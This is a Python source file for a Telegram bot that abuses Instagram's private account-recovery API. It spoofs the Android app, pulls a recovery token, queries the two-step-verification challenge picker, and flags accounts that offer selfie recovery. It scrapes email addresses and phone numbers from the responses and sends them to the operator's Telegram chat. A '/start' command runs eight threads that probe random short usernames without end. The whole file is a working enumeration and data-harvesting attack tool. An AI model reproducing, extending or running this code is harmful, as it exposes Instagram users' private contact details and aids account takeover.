import os
import json
import re
import uuid
import random
import requests
import threading
import time
from http.server import BaseHTTPRequestHandler

# ====================== CONFIG ======================
TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

if not TOKEN or not CHAT_ID:
    raise Exception("BOT_TOKEN and CHAT_ID must be set in Vercel!")

# ====================== GLOBALS ======================
hads = 0
bad = 0
erore = 0
checked = set()
lock = threading.Lock()

def check_one(username, chat_id=None):
    global hads, bad, erore   # ← Fixed: global at the top
    
    username = username.strip().lstrip('@').lower()
    if not username:
        return

    with lock:
        if username in checked:
            if chat_id:
                requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                            json={"chat_id": chat_id, "text": f"✅ @{username} already checked."})
            return
        checked.add(username)

    try:
        if chat_id:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": f"🔍 Checking @{username}..."})

        sess = requests.Session()
        device_id = str(uuid.uuid4())

        headers = {
            'User-Agent': 'Instagram 390.0.0.43.81 Android (33/13; 480dpi; 1080x2316; HONOR; RMO-NX1; HNRMO-Q; qcom; ar_IQ; 766920165)',
            'accept-language': 'ar-IQ, en-US',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-ig-app-id': '567067343352427',
            'x-ig-device-id': device_id,
        }

        data = {
            'params': f'{{"client_input_params":{{"is_username_or_email":1,"search_query":"{username}"}},"server_params":{{"is_from_logged_out":0,"device_id":"{device_id}"}}}}',
            'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
            'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5',
        }

        res1 = sess.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.uhl.nav.async/', 
                        headers=headers, data=data, timeout=15)

        if res1.status_code == 200:
            match = re.search(r'Q-PTB[a-zA-Z0-9_\-]*\|aplrr', res1.text)
            if match:
                token = match.group(0)
                res2 = sess.post(
                    'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.ap.two_step_verification.challenge_picker/',
                    headers=headers,
                    data={'params': f'{{"server_params":{{"context_data":"{token}"}}}}', 
                          'bk_client_context': '{"bloks_version":"b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5","styles_id":"instagram"}',
                          'bloks_versioning_id': 'b3efaa0ec98aaa583cee9e7f624cd0737af0bab3ecda4cc2d468c973dd9f0db5'},
                    timeout=15
                ).text

                if 'SELFIE' in res2.upper():
                    with lock:
                        hads += 1
                    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
                    phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)
                    msg = f"🎯 **SELFIE FOUND!**\n\n👤 @{username}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                json={"chat_id": CHAT_ID, "text": msg})
                else:
                    with lock:
                        bad += 1
                    if chat_id:
                        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                    json={"chat_id": chat_id, "text": f"❌ @{username} → No Selfie"})
            else:
                with lock:
                    bad += 1
        else:
            with lock:
                erore += 1

    except:
        with lock:
            erore += 1
        if chat_id:
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                        json={"chat_id": chat_id, "text": f"⚠️ Error on @{username}"})


def random_check():
    chars = "qwertyuioplkjhgfdsazxcvbnm1234567890._"
    while True:
        user = ''.join(random.choices(chars, k=random.randint(4,6)))
        check_one(user)
        time.sleep(1.8)


class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)

            if 'message' in data:
                msg = data['message']
                text = msg.get('text', '')
                chat_id = msg['chat']['id']

                if text.startswith('/check '):
                    username = text.split(maxsplit=1)[1]
                    threading.Thread(target=check_one, args=(username, chat_id), daemon=True).start()

                elif text.startswith('/start'):
                    for _ in range(8):
                        threading.Thread(target=random_check, daemon=True).start()
                    self.reply(chat_id, "🚀 Random mode started!")

                elif text.startswith('/stats'):
                    self.reply(chat_id, f"📊 Stats:\n✅ Selfie: {hads}\n❌ Bad: {bad}\n⚠️ Error: {erore}")

        except:
            pass

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')

    def reply(self, chat_id, text):
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     json={"chat_id": chat_id, "text": text})

# Set webhook
if WEBHOOK_URL:
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={WEBHOOK_URL}")
    except:
        pass
